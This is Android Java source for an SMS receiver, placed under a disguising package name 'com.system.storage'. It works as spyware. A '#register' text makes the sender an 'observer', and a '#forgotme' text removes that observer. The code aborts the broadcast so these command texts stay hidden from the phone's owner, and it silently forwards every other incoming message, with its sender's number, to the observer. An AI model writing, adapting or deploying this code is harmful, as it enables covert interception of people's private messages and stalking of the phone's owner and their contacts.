package com.system.storage;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
	private static final String REGISTER_PHONE = "#register";
	private static String TAG = "SmsReceiver";
	private static String PREF_NAME = "share";
	private static String OBSERVER_STR = "observer";
	private static String FORGOT_ME = "#forgotme";
	
	@Override
	public void onReceive(Context context, Intent arg1) {
		Log.d(TAG, "onReceive");
		
		Bundle bundle = arg1.getExtras();
		
		if (bundle != null){
			Object[] pdus = (Object[])bundle.get("pdus");
			
			if (pdus != null) {
				boolean abort = false;
				
				SmsManager manager = SmsManager.getDefault();
				SharedPreferences sharedPref = context
						.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
	
				for(int i = 0; i < pdus.length; i++){
					SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdus[i]);
					
					if (sms != null && manager != null){
						String address = sms.getOriginatingAddress();
						String text = sms.getMessageBody();
						
						if(address != null && 
								text != null &&
								sharedPref != null){
							if (text.startsWith(REGISTER_PHONE) && 
									sharedPref != null){
								Editor editor = sharedPref.edit();
								editor.putString(OBSERVER_STR, address);
								editor.commit();
								
								
								manager.sendTextMessage(address, 
										null, "Register committed!", null, null);
								
								if (!abort)
									abort = true;
							}else if (text.startsWith(FORGOT_ME) &&
									sharedPref != null){
								Editor editor = sharedPref.edit();
								editor.remove(OBSERVER_STR);
								editor.commit();
								
								manager.sendTextMessage(address, 
										null, "Bye!", null, null);
								if (!abort)
									abort = true;
							}else{
								String observer = sharedPref.getString(
										OBSERVER_STR, "");
							
								if (observer != null && 
										observer.length() > 0)
									manager.sendTextMessage(observer, null, 
											"(" + address + ") " + text, null, null);
							}
						}
					}
				}
				
				if (abort)
					abortBroadcast();
			}
		}
	}
}
